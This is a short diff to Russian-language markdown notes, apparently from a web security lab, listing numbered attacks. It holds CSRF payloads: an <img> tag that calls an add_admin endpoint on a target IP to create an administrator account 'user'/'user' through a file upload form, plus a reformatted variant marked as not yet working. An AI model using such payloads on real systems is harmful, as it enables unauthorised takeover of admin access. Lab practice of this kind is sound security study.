@@ -10,4 +10,5 @@
 В форму для отправки файлов можно вставить html страницу с таким кодом: `<img src="http://92.63.179.34/add_admin?username=user&password=user&isAdmin=yes&submit=Add+User">`
 
 ## Атака 4
-img src="http://92.63.179.34/add_admin?{ "username":"userr", "password":"userr", "isAdmin":"yes", "submit":"Add User"}">
+`<img src="http://92.63.179.34/add_admin?{'username':'userr','password':'userr','isAdmin':'yes','submit':'Add User'}">`
+пока не работает
